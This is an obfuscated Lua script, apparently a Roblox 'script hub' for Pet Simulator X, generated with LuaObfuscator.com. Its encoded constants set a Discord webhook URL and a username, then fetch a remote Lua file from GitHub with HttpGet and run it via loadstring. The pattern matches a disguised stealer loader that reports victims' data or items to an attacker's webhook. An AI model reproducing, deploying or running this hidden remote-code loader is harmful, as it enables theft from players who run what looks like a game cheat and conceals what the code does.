--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v70=v2(v0(v30,16));if v19 then local v82=v5(v70,v19);v19=nil;return v82;else return v70;end end end);local function v20(v31,v32,v33)if v33 then local v71=0 -(0 + 0) ;local v72;while true do if (v71==((877 -(282 + 595)) -0)) then v72=(v31/((3 -1)^(v32-1)))%(2^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v72-(v72%(1638 -(1523 + 114))) ;end end else local v73=2^(v32-(569 -(367 + 201))) ;return (((v31%(v73 + v73))>=v73) and (928 -(193 + 21 + 713))) or (0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=117 -(32 + 85) ;local v36;local v37;while true do if (v35==(1 -0)) then return (v37 * ((2424 -1103) -(68 + (1347 -(87 + 263))))) + v36 ;end if (v35==(1270 -(226 + 1044))) then v36,v37=v1(v16,v18,v18 + (8 -6) );v18=v18 + (4 -2) ;v35=1 -0 ;end end end local function v23()local v38=180 -(67 + 113) ;local v39;local v40;local v41;local v42;while true do if (v38==(1 + 0)) then return (v42 * 16777216) + (v41 * (160901 -95365)) + (v40 * ((508 -319) + 67)) + v39 ;end if (v38==(0 -(0 -0))) then v39,v40,v41,v42=v1(v16,v18,v18 + (955 -(802 + 150)) );v18=v18 + 4 ;v38=1;end end end local function v24()local v43=(0 -0) + 0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(1000 -(915 + 82))) then if (v48==(0 -0)) then if (v47==(0 + 0)) then return v49 * 0 ;else v48=(1 + 0) -0 ;v46=1187 -(1069 + 118) ;end elseif (v48==(4643 -2596)) then return ((v47==((0 -0) -0)) and (v49 * ((3 -2)/(0 + 0)))) or (v49 * NaN) ;end return v8(v49,v48-(1817 -794) ) * (v46 + (v47/(2^(52 + 0)))) ;end if (v43==(793 -(368 + 423))) then v48=v20(v45,(924 -(814 + 45)) -(108 -64) ,49 -(10 + 8) );v49=((v20(v45,32)==1) and  -(3 -(1 + 1))) or ((157 + 286) -(416 + 26)) ;v43=9 -6 ;end if (v43==(1 + 0)) then v46=1 -0 ;v47=(v20(v45,439 -(145 + 293) ,450 -(44 + 386) ) * ((1488 -(998 + 488))^((896 -(261 + 624)) + 21))) + v44 ;v43=2 + 0 ;end if (v43==(772 -((357 -156) + 571))) then v44=v23();v45=v23();v43=1139 -(116 + 1022) ;end end end local function v25(v50)local v51;if  not v50 then v50=v23();if (v50==(1080 -(1020 + 60))) then return "";end end v51=v3(v16,v18,(v18 + v50) -1 );v18=v18 + v50 ;local v52={};for v68=1424 -(630 + 793) , #v51 do v52[v68]=v2(v1(v3(v51,v68,v68)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0 -0 ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v53~=(0 -0)) then else local v74=0 + 0 ;local v75;while true do if (v74==(0 + 0)) then v75=0 -0 ;while true do if (v75==(0 + 0)) then local v105=0;while true do if (v105==(1 -0)) then v75=732 -(476 + 255) ;break;end if (v105~=(1467 -(899 + 568))) then else v54=0 + 0 ;v55=nil;v105=2 -1 ;end end end if (v75~=(1 -0)) then else v53=604 -(268 + 335) ;break;end end break;end end end if (1==v53) then local v76=290 -(60 + 230) ;while true do if (v76~=0) then else v56=nil;v57=nil;v76=239 -(64 + 174) ;end if (v76~=(573 -(426 + 146))) then else v53=2;break;end end end if (v53~=3) then else v60=nil;while true do local v83=0;while true do if (0~=v83) then else if (v54~=2) then else local v106=0 -0 ;local v107;local v108;while true do if (v106==(0 + 0)) then v107=1456 -(282 + 1174) ;v108=nil;v106=1;end if ((217 -(42 + 174))==v106) then while true do if (v107==(811 -(569 + 242))) then v108=0 -0 ;while true do if (v108==(0 + 0)) then for v191=1,v59 do local v192=0;local v193;local v194;local v195;while true do if (v192~=0) then else v193=0 + 0 ;v194=nil;v192=1;end if (v192~=1) then else v195=nil;while true do if (v193==(0 + 0)) then local v203=1504 -(363 + 1141) ;while true do if (v203==1) then v193=1;break;end if (v203~=0) then else v194=v21();v195=nil;v203=1;end end end if (1==v193) then if (v194==1) then v195=v21()~=0 ;elseif (v194==2) then v195=v24();elseif (v194==(1027 -(706 + 318))) then v195=v25();end v60[v191]=v195;break;end end break;end end end v58[3]=v21();v108=1252 -(721 + 530) ;end if (v108==1) then for v196=1,v23() do local v197=1271 -(945 + 326) ;local v198;local v199;while true do if (v197~=1) then else while true do if (v198==0) then v199=v21();if (v20(v199,1,2 -1 )==(0 + 0)) then local v205=700 -(271 + 429) ;local v206;local v207;local v208;local v209;local v210;while true do if ((0 + 0)==v205) then v206=0 + 0 ;v207=nil;v205=1;end if (v205~=(1502 -(1408 + 92))) then else v210=nil;while true do if (v206==(2 + 0)) then while true do if (v207==1) then local v212=1086 -(461 + 625) ;local v213;while true do if (v212==0) then v213=0;while true do if (v213==(1934 -(565 + 1368))) then v207=1290 -(993 + 295) ;break;end if (v213~=(0 + 0)) then else local v222=1661 -(1477 + 184) ;while true do if (0~=v222) then else v210={v22(),v22(),nil,nil};if (v208==(1171 -(418 + 753))) then local v227=856 -(564 + 292) ;while true do if ((0 -0)==v227) then v210[2 + 1 ]=v22();v210[1 + 3 ]=v22();break;end end elseif (v208==(1 + 0)) then v210[3]=v23();elseif (v208==(1 + 1)) then v210[532 -(406 + 123) ]=v23() -(2^16) ;elseif (v208==(1772 -(1749 + 20))) then local v236=0 + 0 ;local v237;local v238;local v239;while true do if (v236==(1001 -(938 + 63))) then v237=0 + 0 ;v238=nil;v236=1;end if (v236~=(1323 -(1249 + 73))) then else v239=nil;while true do if (v237~=0) then else v238=0 + 0 ;v239=nil;v237=1146 -(466 + 679) ;end if (v237~=(1614 -(1565 + 48))) then else while true do if (v238==(0 -0)) then v239=0 + 0 ;while true do if (v239==0) then v210[8 -5 ]=v23() -((1902 -(106 + 1794))^(283 -(176 + 91))) ;v210[4]=v22();break;end end break;end end break;end end break;end end end v222=2 -1 ;end if (v222~=(1 + 0)) then else v213=1093 -(975 + 117) ;break;end end end end break;end end end if (v207~=(1 + 1)) then else local v214=0;local v215;while true do if (v214~=(0 -0)) then else v215=0 -0 ;while true do if (v215~=(0 + 0)) then else local v223=114 -(4 + 110) ;local v224;while true do if (v223~=(0 -0)) then else v224=584 -(57 + 527) ;while true do if (v224==1) then v215=1428 -(41 + 1386) ;break;end if (v224==0) then if (v20(v209,104 -(17 + 86) ,1 + 0 )~=1) then else v210[3 -1 ]=v60[v210[3 -1 ]];end if (v20(v209,5 -3 ,168 -(122 + 44) )==(1 -0)) then v210[9 -6 ]=v60[v210[5 -2 ]];end v224=2 -1 ;end end break;end end end if (v215==1) then v207=3;break;end end break;end end end if (v207~=(3 + 0)) then else if (v20(v209,3,614 -(602 + 9) )==(1190 -(449 + 740))) then v210[1 + 3 ]=v60[v210[7 -3 ]];end v55[v196]=v210;break;end if (v207~=(65 -(30 + 35))) then else local v217=0 + 0 ;local v218;while true do if (v217~=(1257 -(1043 + 214))) then else v218=0;while true do if (v218==(1 + 0)) then v207=1899 -(260 + 1638) ;break;end if (v218==0) then local v225=0 -0 ;local v226;while true do if (v225~=0) then else v226=0;while true do if (v226~=(440 -(382 + 58))) then else v208=v20(v199,2,9 -6 );v209=v20(v199,4,1218 -(323 + 889) );v226=1 + 0 ;end if ((2 -1)~=v226) then else v218=581 -(361 + 219) ;break;end end break;end end end end break;end end end end break;end if ((1206 -(902 + 303))~=v206) then else v209=nil;v210=nil;v206=322 -(53 + 267) ;end if (v206==0) then local v211=0 + 0 ;while true do if (v211==0) then local v219=0;while true do if (0~=v219) then else v207=413 -(15 + 398) ;v208=nil;v219=983 -(18 + 964) ;end if (v219==(3 -2)) then v211=1 + 0 ;break;end end end if (v211~=(1 + 0)) then else v206=1 + 0 ;break;end end end end break;end if (v205==(851 -(20 + 830))) then v208=nil;v209=nil;v205=2;end end end break;end end break;end if ((0 + 0)==v197) then v198=683 -(483 + 200) ;v199=nil;v197=1;end end end v54=129 -(116 + 10) ;break;end end break;end end break;end end end if (v54~=(1463 -(1404 + 59))) then else local v109=0 + 0 ;while true do if (v109==1) then v57={};v54=739 -(542 + 196) ;break;end if (v109~=0) then else local v120=0 -0 ;while true do if (v120~=(0 + 0)) then else v55={};v56={};v120=1 + 0 ;end if (v120~=(1 + 0)) then else v109=3 -2 ;break;end end end end end v83=2 -1 ;end if (v83==(1 -0)) then if (v54==(7 -4)) then local v110=1551 -(1126 + 425) ;local v111;local v112;while true do if (v110==(406 -(118 + 287))) then while true do if ((0 -0)~=v111) then else v112=0;while true do if (v112~=(1121 -(118 + 1003))) then else local v188=0 -0 ;while true do if ((377 -(142 + 235))==v188) then for v200=1,v23() do v56[v200-(4 -3) ]=v28();end return v58;end end end end break;end end break;end if ((0 + 0)==v110) then v111=0;v112=nil;v110=2 -1 ;end end end if (v54==(1 + 0)) then local v113=977 -(553 + 424) ;local v114;local v115;while true do if (v113==(1 -0)) then while true do if (v114==(0 + 0)) then v115=0 -0 ;while true do if (v115==1) then v60={};v54=2 + 0 ;break;end if (v115~=(163 -(92 + 71))) then else local v189=0 + 0 ;local v190;while true do if (v189~=(0 + 0)) then else v190=765 -(574 + 191) ;while true do if (v190~=(1 + 0)) then else v115=1 + 0 ;break;end if (v190==(0 + 0)) then local v202=0 + 0 ;while true do if (v202~=(0 + 0)) then else v58={v55,v56,nil,v57};v59=v23();v202=2 -1 ;end if (v202~=1) then else v190=1;break;end end end end break;end end end end break;end end break;end if (v113==(1790 -(573 + 1217))) then v114=0 -0 ;v115=nil;v113=1 + 0 ;end end end break;end end end break;end if (2==v53) then local v77=0 + 0 ;local v78;while true do if (v77==(0 -0)) then v78=939 -(714 + 225) ;while true do if (v78~=1) then else v53=756 -(239 + 514) ;break;end if (v78==0) then v58=nil;v59=nil;v78=1 + 0 ;end end break;end end end end end local function v29(v61,v62,v63)local v64=0;local v65;local v66;local v67;while true do if (v64==1) then v67=v61[3];return function(...)local v84=v65;local v85=v66;local v86=v67;local v87=v27;local v88=1;local v89= -1;local v90={};local v91={...};local v92=v12("#",...) -1 ;local v93={};local v94={};for v98=0,v92 do if (v98>=v86) then v90[v98-v86 ]=v91[v98 + 1 ];else v94[v98]=v91[v98 + 1 ];end end local v95=(v92-v86) + 1 ;local v96;local v97;while true do v96=v84[v88];v97=v96[1];if (v97<=5) then if (v97<=2) then if (v97<=0) then v94[v96[2]]=v94[v96[3]][v96[4]];elseif (v97>1) then v94[v96[2]]=v96[3];else local v123=v96[2];v94[v123]=v94[v123](v13(v94,v123 + 1 ,v89));end elseif (v97<=3) then if (v94[v96[2]]==v96[4]) then v88=v88 + 1 ;else v88=v96[3];end elseif (v97>4) then v94[v96[2]]();else local v126;local v127,v128;local v129;local v130;v94[v96[2]]=v94[v96[3]][v96[4]];v88=v88 + 1 ;v96=v84[v88];v94[v96[2]]=v96[3];v88=v88 + 1 ;v96=v84[v88];v130=v96[2];v94[v130](v94[v130 + 1 ]);v88=v88 + 1 ;v96=v84[v88];v94[v96[2]]=v63[v96[3]];v88=v88 + 1 ;v96=v84[v88];v94[v96[2]]=v63[v96[3]];v88=v88 + 1 ;v96=v84[v88];v130=v96[2];v129=v94[v96[3]];v94[v130 + 1 ]=v129;v94[v130]=v129[v96[4]];v88=v88 + 1 ;v96=v84[v88];v94[v96[2]]=v96[3];v88=v88 + 1 ;v96=v84[v88];v130=v96[2];v127,v128=v87(v94[v130](v13(v94,v130 + 1 ,v96[3])));v89=(v128 + v130) -1 ;v126=0;for v152=v130,v89 do local v153=0;while true do if (v153==0) then v126=v126 + 1 ;v94[v152]=v127[v126];break;end end end v88=v88 + 1 ;v96=v84[v88];v130=v96[2];v94[v130]=v94[v130](v13(v94,v130 + 1 ,v89));v88=v88 + 1 ;v96=v84[v88];v94[v96[2]]();end elseif (v97<=8) then if (v97<=6) then local v118=0;local v119;while true do if (v118==9) then v88=v96[3];break;end if (8==v118) then v94[v96[2]]=v96[3];v88=v88 + 1 ;v96=v84[v88];v118=9;end if (v118==0) then v119=nil;v94[v96[2]]=v94[v96[3]][v96[4]];v88=v88 + 1 ;v118=1;end if (v118==3) then v88=v88 + 1 ;v96=v84[v88];v94[v96[2]]=v63[v96[3]];v118=4;end if (v118==6) then v88=v88 + 1 ;v96=v84[v88];v119=v96[2];v118=7;end if (v118==1) then v96=v84[v88];v94[v96[2]]=v96[3];v88=v88 + 1 ;v118=2;end if (v118==2) then v96=v84[v88];v119=v96[2];v94[v119](v94[v119 + 1 ]);v118=3;end if (v118==5) then v88=v88 + 1 ;v96=v84[v88];v94[v96[2]]=v96[3];v118=6;end if (v118==7) then v94[v119](v94[v119 + 1 ]);v88=v88 + 1 ;v96=v84[v88];v118=8;end if (v118==4) then v88=v88 + 1 ;v96=v84[v88];v94[v96[2]]=v94[v96[3]][v96[4]];v118=5;end end elseif (v97==7) then local v141=0;local v142;local v143;while true do if (v141==0) then v142=v96[2];v143=v94[v96[3]];v141=1;end if (v141==1) then v94[v142 + 1 ]=v143;v94[v142]=v143[v96[4]];break;end end else local v144=v96[2];v94[v144](v94[v144 + 1 ]);end elseif (v97<=10) then if (v97>9) then v94[v96[2]]=v63[v96[3]];else v88=v96[3];end elseif (v97==11) then do return;end else local v148=v96[2];local v149,v150=v87(v94[v148](v13(v94,v148 + 1 ,v96[3])));v89=(v150 + v148) -1 ;local v151=0;for v177=v148,v89 do v151=v151 + 1 ;v94[v177]=v149[v151];end end v88=v88 + 1 ;end end;end if (v64==0) then v65=v61[1];v66=v61[2];v64=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F47030A3O00576562682O6F6B55726C03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31303237343034362O33372O32383938312F3836446C67315F36314C3037556D7A65757944544C4856734B345446763075734C7849554939354F506B66704E64524A624C3032546D6B777151574E467948307662336B030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033C3O00682O7470733A2O2F6769746875622E636F6D2F4A61792O696F6365616E2O692F5065616B4F6E546F702F626C6F622F6D61696E2F7065616B2E6C756103083O00557365726E616D6503143O0050657453696D756C61746F72785363726970747A03073O004875624E616D6503073O0030666963487562001C3O0012023O00013O0026033O000F000100020004093O000F000100120A000100033O00200400010001000400122O000200056O00010002000100122O000100063O00122O000200073O00202O00020002000800122O000400096O000200046O00013O00024O0001000100010004093O001B00010026033O0001000100010004093O0001000100120A000100033O00200600010001000A00122O0002000B6O00010002000100122O000100033O00202O00010001000C00122O0002000D6O00010002000100124O00023O00044O000100012O000B3O00017O00",v9(),...);end